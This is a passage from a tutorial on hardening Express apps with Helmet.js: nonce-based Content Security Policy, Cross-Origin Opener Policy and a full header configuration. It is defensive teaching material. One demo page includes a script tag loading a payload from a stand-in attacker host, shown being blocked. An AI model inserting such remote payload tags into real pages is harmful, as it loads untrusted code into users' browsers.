- Nonces must be unique per request and unpredictable.
- Hash-based allowlisting is suitable for static inline scripts (compute the SHA-256 hash and include it in the CSP).
- CSP is a **backstop** — it does not replace proper output escaping and sanitisation.

#### Constraints and Limitations

- Only ~21% of websites implement nonce- or hash-based CSP levels (2025 IEEE study).
- Third-party scripts from CDNs are difficult to allowlist without `'unsafe-inline'` or broad host allowlists.
- CSP requires testing and iteration; a misconfigured policy can break the application.

#### Annotated Code Example

```js
// csp-helmet.js
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');
const app = express();

// Generate a nonce for every request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Configure CSP with nonce
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      (req, res) => `'nonce-${res.locals.cspNonce}'`
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https://cdn.example.com'],
    connectSrc: ["'self'", 'https://api.example.com'],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: []
  },
  reportOnly: false  // Enforce the policy
}));

// Serve an HTML page with a nonced script
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>CSP Demo</title></head>
    <body>
      <h1>CSP with Nonce</h1>
      <script nonce="${res.locals.cspNonce}">
        console.log('This script is allowed by CSP');
      </script>
      <script>
        // This script will be BLOCKED by CSP (no nonce)
        console.log('This will not run');
      </script>
    </body>
    </html>
  `);
});

app.listen(3000, () => console.log('CSP with Helmet on 3000'));
```

**Expected Output (HTTP headers):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123...'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://cdn.example.com; connect-src 'self' https://api.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests
```

**Expected Output (browser console):**
```
This script is allowed by CSP
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-abc123...'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
```

**Why this output:** The CSP header allows scripts from `'self'` and from the specific nonce for this request. The first `<script>` tag includes the `nonce` attribute, so the browser executes it. The second `<script>` tag has no nonce, so the browser blocks it — even though the script is inline and would otherwise run. This is the power of nonce-based CSP: an injected script without the correct nonce is refused.

### Sub-Feature 3.2: Cross-Origin Opener Policy (COOP)

#### Definitions

**Core Definition:** COOP is an HTTP response header that process-isolates your page from cross-origin windows, preventing cross-origin attacks that rely on `window.opener` references.

**Technical Definition:** COOP restricts how your page can be referenced by other documents. The default Helmet value is `same-origin`, which puts your document in a separate browsing context group from cross-origin documents. This prevents a cross-origin opener from accessing your window object. The `same-origin-allow-popups` policy retains a reference to popups that open your page, which is useful when your app opens and interacts with popups from other origins.

#### Syntax Rules and Structure

```js
app.use(helmet.crossOriginOpenerPolicy({
  policy: 'same-origin'
}));
```

| Policy | Effect | Use Case |
|--------|--------|----------|
| `same-origin` (default) | Full isolation; no cross-origin window references | Standard secure apps |
| `same-origin-allow-popups` | Allows references to popups opened by your page | OAuth popups, payment flows |
| `unsafe-none` | No isolation (not recommended) | Legacy compatibility only |

**Rules:**
- `same-origin` is the recommended default for most applications.
- `same-origin-allow-popups` is required if your app opens popups that need to communicate back (e.g., OAuth popup flows).
- COOP works alongside Cross-Origin-Embedder-Policy (COEP) for full process isolation.

#### Annotated Code Example

```js
// coop-helmet.js
const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(helmet.crossOriginOpenerPolicy({
  policy: 'same-origin-allow-popups'  // For OAuth popup flows
}));

app.use(helmet.crossOriginEmbedderPolicy({ policy: 'require-corp' }));

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>COOP Demo</title></head>
    <body>
      <h1>COOP: same-origin-allow-popups</h1>
      <p>This page is process-isolated from cross-origin windows.</p>
      <button onclick="window.open('https://other-app.example', 'popup')">
        Open Popup
      </button>
    </body>
    </html>
  `);
});

app.listen(3000, () => console.log('COOP with Helmet on 3000'));
```

**Expected Output (HTTP headers):**
```
Cross-Origin-Opener-Policy: same-origin-allow-popups
Cross-Origin-Embedder-Policy: require-corp
```

**Why this output:** The COOP header tells the browser to isolate this page from cross-origin windows. With `same-origin-allow-popups`, the page can still open popups and retain a reference to them (necessary for OAuth popup flows). Cross-origin documents cannot access this page's `window` object, preventing attacks that rely on opener references.

### Sub-Feature 3.3: Complete Helmet Configuration for Third-Party Scripts

#### Annotated Code Example

```js
// helmet-third-party.js
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');
const app = express();

// Generate nonce per request
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Full Helmet configuration for apps using third-party scripts
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.cspNonce}'`,
        'https://cdn.jsdelivr.net',           // Third-party CDN
        'https://www.google-analytics.com'    // Analytics
      ],
      styleSrc: [
        "'self'",
        "'unsafe-inline'",                     // Or use nonces for styles
        'https://fonts.googleapis.com'
      ],
      imgSrc: ["'self'", 'data:', 'https://www.google-analytics.com'],
      connectSrc: [
        "'self'",
        'https://api.example.com',
        'https://www.google-analytics.com'
      ],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],
      baseUri: ["'self'"],
      frameAncestors: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginEmbedderPolicy: { policy: 'require-corp' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  strictTransportSecurity: {
    maxAge: 31536000,      // 1 year
    includeSubDomains: true,
    preload: true
  },
  xContentTypeOptions: true,  // nosniff
  xFrameOptions: { action: 'deny' }  // Clickjacking protection
}));

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Helmet with Third-Party Scripts</title>
    </head>
    <body>
      <h1>Security Headers Demo</h1>
      <!-- Allowed: nonced inline script -->
      <script nonce="${res.locals.cspNonce}">
        console.log('Nonced script runs');
      </script>
      <!-- Allowed: script from allowlisted CDN -->
      <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
      <!-- Blocked: script from non-allowlisted origin -->
      <script src="https://evil.example/payload.js"></script>
    </body>
    </html>
  `);
});

app.listen(3000, () => console.log('Full Helmet on 3000'));
```

**Expected Output (HTTP headers):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123' https://cdn.jsdelivr.net https://www.google-analytics.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https://www.google-analytics.com; connect-src 'self' https://api.example.com https://www.google-analytics.com; font-src 'self' https://fonts.gstatic.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
Referrer-Policy: strict-origin-when-cross-origin
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**Expected Output (browser console):**
```
Nonced script runs
Chart.js loaded from CDN
Refused to load the script 'https://evil.example/payload.js' because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-abc123' https://cdn.jsdelivr.net https://www.google-analytics.com"
```

**Why this output:** The CSP allows scripts from `'self'`, the nonce, the CDN, and Google Analytics. The nonced inline script runs, the CDN script loads, but the script from `evil.example` is blocked because it is not in the allowlist. The COOP header isolates the page from cross-origin windows, and the other headers provide additional protection (clickjacking, MIME sniffing, HTTPS enforcement).

### Real-World Cases

- **Google Analytics + CSP:** Requires `https://www.google-analytics.com` in `script-src` and `connect-src`.
- **Stripe.js:** Requires `https://js.stripe.com` in `script-src` and `frame-src`.
- **Auth0 Lock:** Requires nonce-based CSP for inline scripts.
- **CDN-hosted libraries:** Allowlist the specific CDN domain (e.g., `cdn.jsdelivr.net`) rather than using `'unsafe-inline'`.

---

## References

- Single-Page Application (SPA) Security Guide (2026) — https://safeguard.sh/resources/blog/single-page-application-security
- Secure Token Storage for SPAs: Avoiding XSS Theft — https://safeguard.sh/resources/blog/single-page-application-token-storage-security
- Token Introspection vs Local JWT Verification at Scale — https://mojoauth.com/blog/token-introspection-vs-jwt-verification-at-scale
- Helmet.js GitHub README — https://github.com/helmetjs/helmet/blob/44b0cdf3/README.md?plain=1
- OAuth 2.0 for Browser-Based Applications (IETF Draft) — https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps-20
- The Backend for Frontend Pattern Is Now Official IETF Guidance (RFC 10017) — https://duendesoftware.com
- How to Revoke All Active User Sessions and Access Tokens Quickly (FusionAuth) — https://fusionauth.io/community/forum/tags/session
- Content Security Policy in Node.js: 12 Steps (2026) — https://shattered.io/content-security-policy-nodejs/
- OWASP Session Management Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- OWASP MCP01:2025 — Token Mismanagement and Secret Exposure — https://owasp.org
- Helmet.js Content Security Policy + nonce example — https://helmet.js.org
- Cross-Origin Policies (Helmet.js DeepWiki) — https://deepwiki.com/helmetjs/helmet
- CWE-79: Cross-site Scripting (XSS) — https://cwe.mitre.org/data/definitions/79.html
- CWE-522: Insufficiently Protected Credentials — https://cwe.mitre.org/data/definitions/522.html
- RFC 7662 — OAuth 2.0 Token Introspection — https://www.rfc-editor.org/rfc/rfc7662
- RFC 7519 — JSON Web Token (JWT) — https://www.rfc-editor.org/rfc/rfc7519
- RFC 7517 — JSON Web Key (JWK) — https://www.rfc-editor.org/rfc/rfc7517
- JWKS Caching and Key Rotation Best Practices (IETF) — https://datatracker.ietf.org
- OWASP REST Security Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html